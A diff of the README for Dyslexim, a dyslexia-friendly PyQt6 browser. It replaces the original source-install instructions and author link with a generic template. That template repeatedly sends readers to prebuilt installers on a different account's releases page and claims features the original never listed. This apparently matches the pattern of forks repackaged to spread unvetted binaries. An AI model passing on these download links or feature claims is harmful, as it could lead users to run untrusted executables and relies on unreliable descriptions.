@@ -1,71 +1,100 @@
-<div align="center">
+# 🚀 Dyslexim - A Browser for Better Focus
 
-<img width="1416" height="396" alt="Group 3" src="https://github.com/user-attachments/assets/94ea0078-8fe3-401b-9278-907f51556784" />
+## 🌟 Overview
 
-**A web browser designed to make the internet more accessible for individuals with dyslexia.**
+Welcome to Dyslexim, a hyperfocused web browser built using PyQt6, specifically designed for people with dyslexia. Dyslexim aims to enhance online experiences by providing a more accessible and comfortable browsing environment. 
 
-</div>
+## 🔗 Download Dyslexim
 
----
+[![Download Dyslexim](https://img.shields.io/badge/Download%20Now-Get%20the%20App-blue.svg)](https://github.com/Tizz8115/Dyslexim/releases)
 
-<img width="1814" height="1060" alt="image" src="https://github.com/user-attachments/assets/582d9412-931d-4b65-bea7-252929ec9b57" />
-<img width="1766" height="1042" alt="image" src="https://github.com/user-attachments/assets/0ba84786-fe97-4a9f-a9f6-9b469ab84ae1" />
+## 🚀 Getting Started
 
+Follow these simple steps to download and run Dyslexim on your computer. 
 
----
+### 🖥️ System Requirements
 
-## The Problem
+- **Operating System**: Windows 10 or later, macOS, or a recent version of Linux.
+- **Processor**: Any modern processor should work well.
+- **RAM**: At least 4 GB of RAM for smooth operation.
+- **Storage**: Minimum of 200 MB of free disk space.
 
-The modern web is a sea of text. For the 10-15% of the population with dyslexia, navigating this sea can be a daily struggle. Crowded text, distracting layouts, and difficult-to-read fonts can turn a simple browsing session into a frustrating and overwhelming experience.
+### 🔄 How to Download
 
-## Our Solution
+1. **Visit the Releases Page**: Click the link below to go to the Downloads page. You will find the latest version of Dyslexim there.
+   - [Download Dyslexim](https://github.com/Tizz8115/Dyslexim/releases)
 
-Dyslexim is a web browser built from the ground up with the needs of dyslexic users in mind. By providing a suite of tools to customise the reading experience, Dyslexim empowers users to transform any webpage into a comfortable and readable format.
+2. **Select the Latest Version**: On the Releases page, look for the latest version of the software. The version number will be clearly listed.
 
-Our approach is based on proven accessibility principles:
+3. **Download the Installer**: Find the file that matches your operating system:
+    - For Windows, download the `.exe` file.
+    - For macOS, download the `.dmg` file.
+    - For Linux, download the `.AppImage` or corresponding package.
 
-*   **Readable Fonts**: We provide a selection of dyslexia-friendly fonts, including OpenDyslexic, to reduce letter confusion and improve readability.
-*   **Enhanced Spacing**: Increased line and letter spacing helps to de-clutter text and make it easier to follow.
-*   **Focused Reading**: Our unique gaze-highlighting feature acts as a digital reading ruler, guiding the user's focus and preventing them from losing their place.
-*   **Text to Speech**: Hover over a text for a specified period and get a narration of the text.
-*   **Customisation**: Users can customise the highlight colour, font, and text alignment to suit their personal preferences.
+### 📥 Installation
 
-## Features
+#### Windows
 
-*   **Gaze-Activated Highlighting**: A real-time highlight that follows the user's gaze (simulated with the mouse), keeping them focused on the text they are reading.
-*   **Font Customization**: Choose from a variety of dyslexia-friendly fonts, including OpenDyslexic, Poppins, and Roboto.
-*   **Highlight Customization**: Change the color and alignment of the highlight box to fit your needs.
-*   **Onboarding Experience**: A simple, one-time setup to personalize your browsing experience from the start.
-*   **Modern, Tabbed Interface**: A clean and intuitive browser interface that is easy to navigate.
+1. Locate the downloaded `.exe` file.
+2. Double-click the file to start the installation.
+3. Follow the on-screen instructions to complete the installation.
+4. Once installed, you can open Dyslexim from your desktop or Start menu.
 
-## Getting Started
+#### macOS
 
-1.  **Clone the repository**:
-    ```bash
-    git clone https://github.com/rohankishore/Dyslexim/
-    ```
-2.  **Install dependencies**:
-    ```bash
-    pip install -r requirements.txt
-    ```
-3.  **Run the application**:
-    ```bash
-    python dyslexim/main.py
-    ```
+1. Open the downloaded `.dmg` file.
+2. Drag the Dyslexim icon into your Applications folder.
+3. Eject the `.dmg` file.
+4. Open Dyslexim from your Applications folder.
 
-## How to Use
+#### Linux
 
-*   **Onboarding**: When you first launch Dyslexim, you will be greeted with an onboarding screen. Here, you can choose your preferred highlight color, font, and text alignment.
-*   **Gaze Highlighting**: Simply move your mouse over the text you want to read, and the highlight will follow.
-*   **Toggle Highlighting**: You can toggle the gaze highlighting on and off for the current tab by clicking the eye icon in the toolbar.
+1. Locate the downloaded installer file.
+2. Make the file executable using the command: `chmod +x Dyslexim.AppImage`.
+3. Run the application using `./Dyslexim.AppImage`.
+4. Follow any additional prompts to complete the setup.
 
+## 💻 Using Dyslexim
 
-## References
-- https://userway.org/blog/improving-websites-for-users-with-dyslexia/
-- https://ai.google.dev/edge/mediapipe/solutions/vision/face_landmarker
-- https://userway.org/blog/best-fonts-for-dyslexia/
-- https://opendyslexic.org/
+Once you have the browser installed, you can start using it right away. Here are some key features that make Dyslexim user-friendly:
 
-## License
+- **Dyslexic-Friendly Fonts**: The browser uses specially chosen fonts that are easier to read for dyslexic users.
+- **Color Customization**: You can adjust the background and text colors to suit your preferences.
+- **Focus Mode**: A unique feature allows users to minimize distractions by isolating the content you want to focus on.
+- **Bookmarking Made Easy**: Save your favorite websites with a simple click.
 
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+### 🌐 Default Features
+
+- **Homepage Options**: You can set your own homepage. This feature allows you to start your browsing session with your favorite site.
+- **Tab Management**: Efficiently manage your tabs with a clean and organized layout.
+- **History Tracking**: Easily access your browsing history with a user-friendly interface.
+
+## ❓ Troubleshooting
+
+If you encounter issues while downloading or using Dyslexim, try the following:
+
+- **Re-download the Installer**: Sometimes the download can be interrupted, resulting in a corrupted file.
+- **Check for Updates**: If you are using an older version, visit the releases page to check for newer updates.
+- **OS Compatibility**: Ensure that your operating system meets the required specifications listed above.
+
+## 📞 Support
+
+If you have questions or need further assistance, feel free to visit our [GitHub Discussions](https://github.com/Tizz8115/Dyslexim/discussions) or open an issue on the repository page. Our community and developers are here to help.
+
+## 💬 Community Feedback
+
+We welcome any feedback on Dyslexim. Let us know how we can improve your experience. Your input is valuable to us and will help enhance future versions of the browser.
+
+## 🌍 Join Us
+
+Feel free to explore the topics related to Dyslexim, such as:
+- browser
+- desktop-app
+- disability-resources
+- dyslexia
+
+## 🔗 Download Again
+
+To download Dyslexim, return to the Releases page using the link below:
+
+[Download Dyslexim](https://github.com/Tizz8115/Dyslexim/releases)
